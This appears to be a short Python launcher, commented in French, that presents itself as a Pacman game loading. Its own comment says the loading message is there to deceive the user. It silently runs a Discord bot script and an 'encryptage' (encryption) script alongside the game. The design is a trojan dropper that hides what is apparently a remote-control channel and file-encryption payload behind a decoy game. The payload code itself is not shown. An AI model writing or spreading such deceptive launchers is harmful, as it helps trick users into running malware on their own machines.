import subprocess
import threading
import time

def run_script(script_name):
    print(f"💻 Lancement de {script_name}...")
    subprocess.run(["python", script_name])

if __name__ == "__main__":
    # Délai pour faire croire que le jeu se charge
    print("🎮 Chargement du jeu Pacman...")
    
    subprocess.run(["python", "Bot_Discord.py"])

    # Lancer les scripts en parallèle
    scripts = ["encryptage.py", "pacman.py"]
    threads = [threading.Thread(target=run_script, args=(script,)) for script in scripts]

    # Démarrer les threads
    for thread in threads:
        thread.start()

    # Attendre la fin des threads
    for thread in threads:
        thread.join()

    print("✅ Tous les scripts sont terminés. Bon jeu !")
